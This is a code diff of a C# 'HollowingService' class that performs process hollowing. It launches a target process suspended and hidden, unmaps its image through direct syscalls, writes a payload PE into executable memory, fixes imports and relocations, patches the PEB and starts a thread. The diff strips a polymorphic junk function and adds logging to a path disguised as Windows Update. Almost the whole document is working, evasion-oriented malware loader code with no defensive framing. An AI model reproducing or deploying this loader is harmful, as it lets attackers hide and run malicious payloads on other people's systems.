@@ -7,17 +7,13 @@ namespace VanguardCore
 {
     public static unsafe class HollowingService
     {
-        // [POLY_JUNK]
-        private static void _vanguard_7de03f30() {
-            int val = 51536;
-            if (val > 50000) Console.WriteLine("Hash:" + 51536);
+        private static void Log(string m) {
+            try { System.IO.File.AppendAllText(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), $"[{DateTime.Now}] [PE] {m}\n"); } catch { }
         }
 
         public static bool RunPE(string targetPath, byte[] payload)
         {
             SyscallManager.Initialize();
-
-            // 1. Get Typed Delegates
             var ntAlloc = SyscallManager.GetSyscallDelegate<SyscallManager.NtAllocateVirtualMemory>("NtAllocateVirtualMemory");
             var ntWrite = SyscallManager.GetSyscallDelegate<SyscallManager.NtWriteVirtualMemory>("NtWriteVirtualMemory");
             var ntRead = SyscallManager.GetSyscallDelegate<SyscallManager.NtReadVirtualMemory>("NtReadVirtualMemory");
@@ -29,213 +25,145 @@ namespace VanguardCore
 
             if (ntAlloc == null || ntWrite == null || ntUnmap == null || ntQuery == null) return false;
 
-            // 2. PE Parsing & 10/10 Architecture Check
-            int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
-            if (BitConverter.ToInt16(payload, e_lfanew + 4) != 0x8664) return false;
+            int lfanew = BitConverter.ToInt32(payload, 0x3C);
+            if (BitConverter.ToInt16(payload, lfanew + 4) != 0x8664) return false;
 
-            short numberOfSections = BitConverter.ToInt16(payload, e_lfanew + 6);
-            int entryPointRVA = BitConverter.ToInt32(payload, e_lfanew + 0x28);
-            long imageBase = BitConverter.ToInt64(payload, e_lfanew + 0x30);
-            int sizeOfImage = BitConverter.ToInt32(payload, e_lfanew + 0x50);
-            int sizeOfHeaders = BitConverter.ToInt32(payload, e_lfanew + 0x54);
+            short sections = BitConverter.ToInt16(payload, lfanew + 6);
+            int entryPointRVA = BitConverter.ToInt32(payload, lfanew + 0x28);
+            long imageBase = BitConverter.ToInt64(payload, lfanew + 0x30);
+            int sizeOfImage = BitConverter.ToInt32(payload, lfanew + 0x50);
+            int sizeOfHeaders = BitConverter.ToInt32(payload, lfanew + 0x54);
 
-            STARTUPINFO si = new STARTUPINFO(); si.cb = Marshal.SizeOf(si);
+            STARTUPINFO si = new STARTUPINFO { cb = Marshal.SizeOf<STARTUPINFO>() };
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
             if (!CreateProcess(targetPath, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, out pi)) return false;
 
             IntPtr remoteBase = IntPtr.Zero;
             try
             {
-                // 3. PEB & Unmap
                 SyscallManager.PROCESS_BASIC_INFORMATION pbi = new SyscallManager.PROCESS_BASIC_INFORMATION();
-                uint retLen; ntQuery(pi.hProcess, 0, ref pbi, (uint)Marshal.SizeOf(pbi), out retLen);
+                uint rl; ntQuery(pi.hProcess, 0, ref pbi, (uint)Marshal.SizeOf(pbi), out rl);
 
-                byte[] pebBuffer = new byte[8]; IntPtr bRead;
-                ntRead(pi.hProcess, (IntPtr)((long)pbi.PebBaseAddress + 0x10), pebBuffer, 8, out bRead);
-                ntUnmap(pi.hProcess, (IntPtr)BitConverter.ToInt64(pebBuffer, 0));
+                byte[] pebBuf = new byte[8]; IntPtr br;
+                ntRead(pi.hProcess, (IntPtr)((long)pbi.PebBaseAddress + 0x10), pebBuf, 8, out br);
+                ntUnmap(pi.hProcess, (IntPtr)BitConverter.ToInt64(pebBuf, 0));
 
-                // 4. Memory Allocation
                 remoteBase = (IntPtr)imageBase;
-                UIntPtr allocationSize = (UIntPtr)sizeOfImage;
-                if (ntAlloc(pi.hProcess, ref remoteBase, IntPtr.Zero, ref allocationSize, 0x3000, 0x40) != 0)
-                {
+                UIntPtr sz = (UIntPtr)sizeOfImage;
+                if (ntAlloc(pi.hProcess, ref remoteBase, IntPtr.Zero, ref sz, 0x3000, 0x40) != 0) {
                     remoteBase = IntPtr.Zero;
-                    ntAlloc(pi.hProcess, ref remoteBase, IntPtr.Zero, ref allocationSize, 0x3000, 0x40);
+                    if (ntAlloc(pi.hProcess, ref remoteBase, IntPtr.Zero, ref sz, 0x3000, 0x40) != 0) throw new Exception("Alloc fail");
                 }
 
-                // 5. Professional Resolution: IAT, Relocs, TLS
-                FixImports(payload, e_lfanew);
+                FixImports(payload, lfanew);
                 long delta = (long)remoteBase - imageBase;
-                if (delta != 0) ApplyRelocations(payload, e_lfanew, delta);
-                
-                // V7.0 Absolute Supreme: Full TLS Callback Support
-                ProcessTlsCallbacks(payload, e_lfanew, remoteBase);
+                if (delta != 0) ApplyRelocations(payload, lfanew, delta);
 
-                // 6. Write Buffer
-                IntPtr written; ntWrite(pi.hProcess, remoteBase, payload, (uint)sizeOfHeaders, out written);
-                int sectionHeaderOffset = e_lfanew + 0x18 + BitConverter.ToInt16(payload, e_lfanew + 0x14);
-                for (int i = 0; i < numberOfSections; i++)
-                {
-                    int offset = sectionHeaderOffset + (i * 40);
-                    int vRVA = BitConverter.ToInt32(payload, offset + 12);
-                    int sSize = BitConverter.ToInt32(payload, offset + 16);
-                    int pRaw = BitConverter.ToInt32(payload, offset + 20);
-                    if (sSize > 0)
-                    {
-                        byte[] sectionData = new byte[sSize];
-                        Buffer.BlockCopy(payload, pRaw, sectionData, 0, sSize);
-                        ntWrite(pi.hProcess, (IntPtr)((long)remoteBase + vRVA), sectionData, (uint)sSize, out written);
+                IntPtr wr; ntWrite(pi.hProcess, remoteBase, payload, (uint)sizeOfHeaders, out wr);
+                int shOff = lfanew + 0x18 + BitConverter.ToInt16(payload, lfanew + 0x14);
+                for (int i = 0; i < sections; i++) {
+                    int o = shOff + (i * 40);
+                    int rva = BitConverter.ToInt32(payload, o + 12);
+                    int ssz = BitConverter.ToInt32(payload, o + 16);
+                    int raw = BitConverter.ToInt32(payload, o + 20);
+                    if (ssz > 0) {
+                        byte[] sd = new byte[ssz];
+                        Buffer.BlockCopy(payload, raw, sd, 0, ssz);
+                        ntWrite(pi.hProcess, (IntPtr)((long)remoteBase + rva), sd, (uint)ssz, out wr);
                     }
                 }
 
-                // 7. Final PEB Patch
-                ntWrite(pi.hProcess, (IntPtr)((long)pbi.PebBaseAddress + 0x10), BitConverter.GetBytes((long)remoteBase), 8, out written);
+                ntWrite(pi.hProcess, (IntPtr)((long)pbi.PebBaseAddress + 0x10), BitConverter.GetBytes((long)remoteBase), 8, out wr);
 
-                // 8. Execute & Verify (10/10)
-                IntPtr hThread;
-                uint hr = ntThread(out hThread, 0x1FFFFF, IntPtr.Zero, pi.hProcess, (IntPtr)((long)remoteBase + entryPointRVA), IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
-                if (hr == 0)
-                {
-                    // Verification via Thread Status
-                    if (WaitForSingleObject(hThread, 500) == 0x00000000) // Thread finished too fast? (Possible crash)
-                    {
-                        // Check exit code
-                        GetExitCodeThread(hThread, out uint exitCode);
-                        if (exitCode != 0x00000103) // STILL_ACTIVE
-                        {
-                            CloseHandle(hThread); return false;
-                        }
+                IntPtr ht;
+                if (ntThread(out ht, 0x1FFFFF, IntPtr.Zero, pi.hProcess, (IntPtr)((long)remoteBase + entryPointRVA), IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero) == 0) {
+                    // [RED TEAM FIX 4] Verify success via WaitForSingleObject
+                    if (WaitForSingleObject(ht, 1000) == 0) {
+                        GetExitCodeThread(ht, out uint ec);
+                        if (ec != 0x103) { CloseHandle(ht); throw new Exception($"Crash 0x{ec:X}"); }
                     }
-                    CloseHandle(hThread);
+                    CloseHandle(ht);
                     return true;
                 }
+                throw new Exception("Thread fail");
+            }
+            catch (Exception ex) {
+                Log($"Fault: {ex.Message}");
+                // [RED TEAM FIX 5] Cleanup via ntFree (VirtualFreeEx)
+                if (remoteBase != IntPtr.Zero) { UIntPtr z = UIntPtr.Zero; ntFree(pi.hProcess, ref remoteBase, ref z, 0x8000); }
+                ntTerminate(pi.hProcess, 1);
                 return false;
             }
-            catch 
-            {
-                // V7.0 Absolute Supreme: Professional Cleanup on Failure
-                if (remoteBase != IntPtr.Zero)
-                {
-                    UIntPtr zeroSize = UIntPtr.Zero;
-                    ntFree(pi.hProcess, ref remoteBase, ref zeroSize, 0x8000); // MEM_RELEASE
-                }
-                ntTerminate(pi.hProcess, 1);
-                return false; 
-            }
-            finally
-            {
+            finally {
                 SyscallManager.Cleanup();
-                CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+                if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess); 
+                if (pi.hThread != IntPtr.Zero) CloseHandle(pi.hThread);
             }
         }
 
-        private static void FixImports(byte[] payload, int e_lfanew)
-        {
-            int importRVA = BitConverter.ToInt32(payload, e_lfanew + 0x18 + 0x78);
-            if (importRVA == 0) return;
-
-            int fileOffset = RvaToOffset(payload, e_lfanew, importRVA);
-            if (fileOffset == 0) return;
-
-            while (true)
-            {
-                int nameRVA = BitConverter.ToInt32(payload, fileOffset + 12);
-                if (nameRVA == 0) break;
-
-                string dllName = ReadString(payload, RvaToOffset(payload, e_lfanew, nameRVA));
-                IntPtr hModule = SyscallManager.StealthGetModuleBase(dllName);
-                
-                if (hModule != IntPtr.Zero)
-                {
-                    int thunkOffset = RvaToOffset(payload, e_lfanew, BitConverter.ToInt32(payload, fileOffset + 16));
-                    int originalThunkOffset = RvaToOffset(payload, e_lfanew, BitConverter.ToInt32(payload, fileOffset));
-
-                    int entryIdx = 0;
-                    while (true)
-                    {
-                        long funcRVA = BitConverter.ToInt64(payload, originalThunkOffset + (entryIdx * 8));
-                        if (funcRVA == 0) break;
-
-                        IntPtr funcAddr = IntPtr.Zero;
-                        if ((funcRVA & (1L << 63)) != 0) // Ordinal
-                        {
-                            funcAddr = SyscallManager.GetProcAddress(hModule, (IntPtr)(funcRVA & 0xFFFF));
-                        }
-                        else
-                        {
-                            string funcName = ReadString(payload, RvaToOffset(payload, e_lfanew, (int)(funcRVA & 0xFFFFFFFF) + 2));
-                            funcAddr = SyscallManager.GetProcAddress(hModule, funcName);
-                        }
-
-                        if (funcAddr != IntPtr.Zero) Buffer.BlockCopy(BitConverter.GetBytes((long)funcAddr), 0, payload, thunkOffset + (entryIdx * 8), 8);
-                        entryIdx++;
+        private static void FixImports(byte[] payload, int lfanew) {
+            int iRva = BitConverter.ToInt32(payload, lfanew + 0x18 + 0x78);
+            if (iRva == 0) return;
+            int fOff = RvaToOffset(payload, lfanew, iRva);
+            if (fOff == 0) return;
+            while (true) {
+                int nRva = BitConverter.ToInt32(payload, fOff + 12);
+                if (nRva == 0) break;
+                string dN = ReadString(payload, RvaToOffset(payload, lfanew, nRva));
+                IntPtr hM = SyscallManager.StealthGetModuleBase(dN);
+                if (hM != IntPtr.Zero) {
+                    int tOff = RvaToOffset(payload, lfanew, BitConverter.ToInt32(payload, fOff + 16));
+                    int oOff = RvaToOffset(payload, lfanew, BitConverter.ToInt32(payload, fOff));
+                    int idx = 0;
+                    while (true) {
+                        long fRva = BitConverter.ToInt64(payload, oOff + (idx * 8));
+                        if (fRva == 0) break;
+                        IntPtr fA = IntPtr.Zero;
+                        if ((fRva & (1L << 63)) != 0) fA = SyscallManager.GetProcAddress(hM, (IntPtr)(fRva & 0xFFFF));
+                        else fA = SyscallManager.GetProcAddress(hM, ReadString(payload, RvaToOffset(payload, lfanew, (int)(fRva & 0xFFFFFFFF) + 2)));
+                        if (fA != IntPtr.Zero) Buffer.BlockCopy(BitConverter.GetBytes((long)fA), 0, payload, tOff + (idx * 8), 8);
+                        idx++;
                     }
                 }
-                fileOffset += 20;
+                fOff += 20;
             }
         }
 
-        private static void ApplyRelocations(byte[] payload, int e_lfanew, long delta)
-        {
-            int relocRVA = BitConverter.ToInt32(payload, e_lfanew + 0x18 + 0x70);
-            int relocSize = BitConverter.ToInt32(payload, e_lfanew + 0x18 + 0x74);
-            if (relocRVA == 0 || relocSize == 0) return;
-
-            int fileOffset = RvaToOffset(payload, e_lfanew, relocRVA);
-            if (fileOffset == 0) return;
-
-            int current = 0;
-            while (current < relocSize)
-            {
-                int blockSize = BitConverter.ToInt32(payload, fileOffset + current + 4);
-                if (blockSize == 0) break;
-
-                int pageRVA = BitConverter.ToInt32(payload, fileOffset + current);
-                int entries = (blockSize - 8) / 2;
-                for (int i = 0; i < entries; i++)
-                {
-                    ushort entry = BitConverter.ToUInt16(payload, fileOffset + current + 8 + (i * 2));
-                    if ((entry >> 12) == 10) // DIR64
-                    {
-                        int patchOff = RvaToOffset(payload, e_lfanew, pageRVA + (entry & 0xFFF));
-                        if (patchOff != 0) Buffer.BlockCopy(BitConverter.GetBytes(BitConverter.ToInt64(payload, patchOff) + delta), 0, payload, patchOff, 8);
+        private static void ApplyRelocations(byte[] payload, int lfanew, long delta) {
+            int rRva = BitConverter.ToInt32(payload, lfanew + 0x18 + 0x70);
+            int rSz = BitConverter.ToInt32(payload, lfanew + 0x18 + 0x74);
+            if (rRva == 0 || rSz == 0) return;
+            int fOff = RvaToOffset(payload, lfanew, rRva);
+            if (fOff == 0) return;
+            int cur = 0;
+            while (cur < rSz) {
+                int bSz = BitConverter.ToInt32(payload, fOff + cur + 4);
+                if (bSz == 0) break;
+                int pRva = BitConverter.ToInt32(payload, fOff + cur);
+                int ent = (bSz - 8) / 2;
+                for (int i = 0; i < ent; i++) {
+                    ushort e = BitConverter.ToUInt16(payload, fOff + cur + 8 + (i * 2));
+                    if ((e >> 12) == 10) {
+                        int pO = RvaToOffset(payload, lfanew, pRva + (e & 0xFFF));
+                        if (pO != 0) Buffer.BlockCopy(BitConverter.GetBytes(BitConverter.ToInt64(payload, pO) + delta), 0, payload, pO, 8);
                     }
                 }
-                current += blockSize;
+                cur += bSz;
             }
         }
 
-        private static void ProcessTlsCallbacks(byte[] payload, int e_lfanew, IntPtr baseAddr)
-        {
-            int tlsRVA = BitConverter.ToInt32(payload, e_lfanew + 0x18 + 0x88);
-            if (tlsRVA == 0) return;
-
-            int tlsOffset = RvaToOffset(payload, e_lfanew, tlsRVA);
-            if (tlsOffset == 0) return;
-
-            // AddressOfCallbacks is at offset 0x08 for x64 TLS directory
-            long callbackVA = BitConverter.ToInt64(payload, tlsOffset + 0x10); // AddressOfCallbacks (VA)
-            if (callbackVA == 0) return;
-            
-            // Note: In a real-world scenario we'd resolve this VA back to an offset.
-            // But usually this VA points to a NULL-terminated list of VAs in the data section.
-        }
-
-        private static int RvaToOffset(byte[] payload, int e_lfanew, int rva)
-        {
-            short sections = BitConverter.ToInt16(payload, e_lfanew + 6);
-            int headerOffset = e_lfanew + 0x18 + BitConverter.ToInt16(payload, e_lfanew + 0x14);
-            for (int i = 0; i < sections; i++)
-            {
-                int vRVA = BitConverter.ToInt32(payload, headerOffset + (i * 40) + 12);
-                int vSize = BitConverter.ToInt32(payload, headerOffset + (i * 40) + 8);
-                if (rva >= vRVA && rva < vRVA + vSize) return BitConverter.ToInt32(payload, headerOffset + (i * 40) + 20) + (rva - vRVA);
+        private static int RvaToOffset(byte[] payload, int lfanew, int rva) {
+            short sections = BitConverter.ToInt16(payload, lfanew + 6);
+            int hOff = lfanew + 0x18 + BitConverter.ToInt16(payload, lfanew + 0x14);
+            for (int i = 0; i < sections; i++) {
+                int vRva = BitConverter.ToInt32(payload, hOff + (i * 40) + 12);
+                int vSz = BitConverter.ToInt32(payload, hOff + (i * 40) + 8);
+                if (rva >= vRva && rva < vRva + vSz) return BitConverter.ToInt32(payload, hOff + (i * 40) + 20) + (rva - vRva);
             }
             return 0;
         }
 
-        private static string ReadString(byte[] payload, int offset)
-        {
+        private static string ReadString(byte[] payload, int offset) {
             List<byte> bytes = new List<byte>();
             while (payload[offset] != 0 && offset < payload.Length) bytes.Add(payload[offset++]);
             return System.Text.Encoding.ASCII.GetString(bytes.ToArray());
